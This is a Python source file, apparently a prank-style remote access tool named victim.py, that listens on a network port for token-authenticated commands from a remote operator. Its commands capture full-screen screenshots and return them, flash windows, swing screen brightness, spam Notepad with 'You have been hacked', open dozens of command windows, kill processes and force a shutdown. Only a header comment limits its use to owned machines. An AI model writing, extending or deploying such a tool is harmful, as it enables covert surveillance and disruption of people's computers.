# victim.py
# RUN THIS ONLY ON MACHINES YOU OWN / HAVE PERMISSION TO TEST
# Adds a "screenshot" action which captures the screen and returns a base64 PNG in the ACK.

import os
import socket
import json
import threading
import subprocess
import time
import uuid
import sys
import traceback
import base64
import io

try:
    import win32gui
    import win32con
except Exception:
    win32gui = None
    win32con = None

# Prefer mss for fast cross-platform screenshots; fallback to PIL ImageGrab on Windows
try:
    import mss
    import mss.tools
except Exception:
    mss = None

try:
    from PIL import ImageGrab, Image
except Exception:
    ImageGrab = None
    Image = None

try:
    import pyautogui
except Exception:
    pyautogui = None

try:
    import screen_brightness_control as sbc
except Exception:
    sbc = None

HOST = "0.0.0.0"
PORT = int(os.getenv("TCP_PORT", "9999"))
SHARED_TOKEN = os.getenv("TG_SECRET", "vigneshhacker")
SOCKET_TIMEOUT = 6
# increased to allow screenshot payloads (adjust as needed for your lab)
MAX_MESSAGE_SIZE = 300 * 1024  # 300 KB
SHUTDOWN_ALLOWED = os.getenv("ALLOW_SHUTDOWN", "0") == "1"

stop_flag = threading.Event()

# ---------------- Action functions ----------------
def flash_screen():
    try:
        if not win32gui or not win32con:
            print("[!] win32gui not available — cannot flash screen.")
            return
        for _ in range(100):
            if stop_flag.is_set():
                break
            h = win32gui.GetForegroundWindow()
            win32gui.ShowWindow(h, win32con.SW_HIDE)
            time.sleep(0.08)
            win32gui.ShowWindow(h, win32con.SW_SHOW)
            time.sleep(0.08)
    except Exception as e:
        print("Error in flash_screen:", e)

def crazy_brightness():
    """Rapidly change screen brightness (best-effort)."""
    try:
        if not sbc:
            print("[!] screen_brightness_control not installed — skipping brightness changes.")
            return
        for _ in range(200):
            if stop_flag.is_set():
                break
            sbc.set_brightness(100)
            time.sleep(0.18)
            sbc.set_brightness(1)
            time.sleep(0.18)
    except Exception as e:
        print("Error in crazy_brightness:", e)

def lol_attack():
    """Open notepad and spam typed text (uses pyautogui if available)."""
    try:
        subprocess.Popen("notepad.exe")
        time.sleep(1.0)
        if not pyautogui:
            print("[!] pyautogui not installed — cannot type into Notepad.")
            return
        for _ in range(500):
            if stop_flag.is_set():
                break
            pyautogui.typewrite("You have been hacked, buddy")
            pyautogui.press("enter")
    except Exception as e:
        print("Error in lol_attack:", e)

def cli_hack():
    """Open many cmd windows running a simple command."""
    try:
        for _ in range(50):
            if stop_flag.is_set():
                break
            subprocess.Popen(['cmd.exe', '/c', 'start', 'cmd.exe', '/K', 'cd / && color a && tree'], shell=False)
            time.sleep(0.2)
    except Exception as e:
        print("Error in cli_hack:", e)

def stop_all():
    """Signal running threads to stop and terminate known apps."""
    try:
        stop_flag.set()
        print("[*] Stopping all attacks...")
        # Kill common processes started by this tool
        # (you asked earlier about removing vlc; I left the taskkill for vlc in place — tell me if you want it removed)
        subprocess.run("taskkill /IM vlc.exe /F", shell=True)
        subprocess.run("taskkill /IM notepad.exe /F", shell=True)
        subprocess.run("taskkill /IM cmd.exe /F", shell=True)
    except Exception as e:
        print("Error in stop_all:", e)

# ---------------- Screenshot helper ----------------
def capture_screenshot_png_bytes() -> bytes | None:
    """
    Capture the entire primary screen and return PNG bytes.
    Uses mss when available (fast), otherwise tries PIL.ImageGrab on Windows.
    Returns None on failure.
    """
    try:
        # Try mss first (cross-platform and fast)
        if mss:
            with mss.mss() as s:
                monitor = s.monitors[0]  # full virtual screen
                img = s.grab(monitor)
                png_bytes = mss.tools.to_png(img.rgb, img.size)
                return png_bytes
        # Fallback to PIL ImageGrab (Windows/mac)
        if ImageGrab:
            img = ImageGrab.grab(all_screens=True) if hasattr(ImageGrab, "grab") else ImageGrab.grab()
            buf = io.BytesIO()
            img.save(buf, format="PNG")
            return buf.getvalue()
    except Exception as e:
        print("Error capturing screenshot:", e)
        return None
    return None

# ---------------- Helper functions ----------------
def safe_recv_line(conn: socket.socket) -> str | None:
    """
    Receive bytes until newline is seen, or MAX_MESSAGE_SIZE reached, or EOF.
    Returns decoded string without newline, or None on timeout/closed.
    """
    conn.settimeout(SOCKET_TIMEOUT)
    data = b""
    try:
        while True:
            chunk = conn.recv(4096)
            if not chunk:
                # connection closed by peer
                break
            data += chunk
            if b"\n" in data:
                line, _, _ = data.partition(b"\n")
                # discard anything after newline (if multi-message arrived)
                return line.decode(errors="ignore").strip()
            if len(data) > MAX_MESSAGE_SIZE:
                print("[!] Incoming message too large, dropping.")
                return None
    except socket.timeout:
        print("[!] recv timeout")
        return None
    except Exception as e:
        print("Error in safe_recv_line:", e)
        return None
    return None

def send_ack(conn: socket.socket, cmd_id: str, status: str, msg: str = "", extra: dict | None = None):
    """Send newline-terminated JSON ack back to sender."""
    ack = {"id": cmd_id or str(uuid.uuid4()), "status": status, "msg": msg}
    if extra:
        ack.update(extra)
    try:
        data = json.dumps(ack) + "\n"
        conn.sendall(data.encode())
    except Exception as e:
        print("Error sending ACK:", e)

# ---------------- Command dispatcher ----------------
ALLOWED_CMDS = {"screenshot", "crazybrightness", "stopall", "shutdown", "lol", "clihack", "flashscreen"}

def handle_command(payload: dict, conn: socket.socket):
    """
    Execute a validated payload. This runs in the handler thread (not the main accept loop).
    payload already validated for token and format.
    """
    cmd = payload.get("cmd")
    args = payload.get("args", {}) or {}
    cmd_id = payload.get("id", str(uuid.uuid4()))

    if cmd not in ALLOWED_CMDS:
        send_ack(conn, cmd_id, "error", f"unsupported command: {cmd}")
        return

    # Reset stop flag for new command execution (except stopall)
    if cmd != "stopall":
        stop_flag.clear()

    # Dispatch commands (spawn new thread for potentially long-running ones)
    try:
        if cmd == "screenshot":
            # Take screenshot synchronously and include it in ACK (base64 PNG)
            png = capture_screenshot_png_bytes()
            if png is None:
                send_ack(conn, cmd_id, "error", "screenshot failed")
                return

            # Optionally limit the size we send back (encode and check)
            b64 = base64.b64encode(png).decode()
            # If image too large to fit in a single message, attempt to trim by resizing
            approx_size = len(b64)
            if approx_size > (MAX_MESSAGE_SIZE // 1):  # rough guard (JSON overhead)
                # try to downscale using PIL if available
                try:
                    if Image:
                        img = Image.open(io.BytesIO(png))
                        # downscale to 50% until small enough or minimal size reached
                        scale = 0.5
                        while True:
                            new_w = max(200, int(img.width * scale))
                            new_h = max(200, int(img.height * scale))
                            img_small = img.resize((new_w, new_h), Image.LANCZOS)
                            buf = io.BytesIO()
                            img_small.save(buf, format="PNG", optimize=True)
                            png_small = buf.getvalue()
                            b64_small = base64.b64encode(png_small).decode()
                            if len(b64_small) <= MAX_MESSAGE_SIZE - 200 or (new_w <= 200 or new_h <= 200):
                                b64 = b64_small
                                break
                            # reduce scale further
                            scale *= 0.7
                    else:
                        # no PIL available and image too large
                        send_ack(conn, cmd_id, "error", "screenshot too large and cannot downscale (PIL not available)")
                        return
                except Exception as e:
                    print("Error while attempting to downscale screenshot:", e)
                    send_ack(conn, cmd_id, "error", "screenshot downscale failed")
                    return

            # Send the base64 PNG in the ACK under key "img_b64"
            send_ack(conn, cmd_id, "ok", "screenshot", extra={"img_b64": b64})
            return

        elif cmd == "crazybrightness":
            threading.Thread(target=crazy_brightness, daemon=True).start()
            send_ack(conn, cmd_id, "ok", "started crazy brightness")

        elif cmd == "stopall":
            stop_all()
            send_ack(conn, cmd_id, "ok", "stopped all attacks")

        elif cmd == "shutdown":
            # Extra safety: only run shutdown if allowed via env var
            if not SHUTDOWN_ALLOWED:
                send_ack(conn, cmd_id, "error", "shutdown not allowed (set ALLOW_SHUTDOWN=1)")
                return
            send_ack(conn, cmd_id, "ok", "shutting down now")
            # Actual shutdown (force)
            subprocess.Popen("shutdown /s /t 0", shell=True)

        elif cmd == "lol":
            threading.Thread(target=lol_attack, daemon=True).start()
            send_ack(conn, cmd_id, "ok", "started lol attack")

        elif cmd == "clihack":
            threading.Thread(target=cli_hack, daemon=True).start()
            send_ack(conn, cmd_id, "ok", "started cli hack")

        elif cmd == "flashscreen":
            threading.Thread(target=flash_screen, daemon=True).start()
            send_ack(conn, cmd_id, "ok", "started flashscreen")

        else:
            send_ack(conn, cmd_id, "error", "unknown command")
    except Exception as e:
        tb = traceback.format_exc()
        print("Error executing command:", e, tb)
        send_ack(conn, cmd_id, "error", f"exception: {e}")

# ---------------- Client handler ----------------
def handle_client_connection(conn: socket.socket, addr):
    try:
        print(f"[+] Connection from {addr}")
        raw = safe_recv_line(conn)
        if not raw:
            print("[!] No data received or timeout from", addr)
            conn.close()
            return
        # Parse JSON
        try:
            payload = json.loads(raw)
        except Exception:
            send_ack(conn, None, "error", "invalid json")
            conn.close()
            return

        # Validate payload structure
        token = payload.get("token")
        if token != SHARED_TOKEN:
            send_ack(conn, payload.get("id"), "error", "invalid token")
            conn.close()
            return

        # Basic sanity checks
        if not isinstance(payload.get("cmd"), str):
            send_ack(conn, payload.get("id"), "error", "cmd must be a string")
            conn.close()
            return

        # Execute the command (non-blocking)
        handle_command(payload, conn)

    except Exception as e:
        print("Unhandled error in client handler:", e)
    finally:
        try:
            conn.close()
        except Exception:
            pass

# ---------------- Server start ----------------
def start_server():
    print("[*] Starting victim server")
    print(f"[*] Listening on {HOST}:{PORT}")
    print(f"[*] Expected token = <{SHARED_TOKEN[:8]}...>  (change with TG_SECRET env var)")
    if SHUTDOWN_ALLOWED:
        print("[!] Shutdown is ENABLED (ALLOW_SHUTDOWN=1)")
    else:
        print("[!] Shutdown is DISABLED (to enable, set ALLOW_SHUTDOWN=1)")

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((HOST, PORT))
    s.listen(8)

    try:
        while True:
            conn, addr = s.accept()
            t = threading.Thread(target=handle_client_connection, args=(conn, addr), daemon=True)
            t.start()
    except KeyboardInterrupt:
        print("\n[*] Exiting on user interrupt.")
        s.close()
        sys.exit(0)
    except Exception as e:
        print("Server error:", e)
        s.close()
        sys.exit(1)

if __name__ == "__main__":
    start_server()
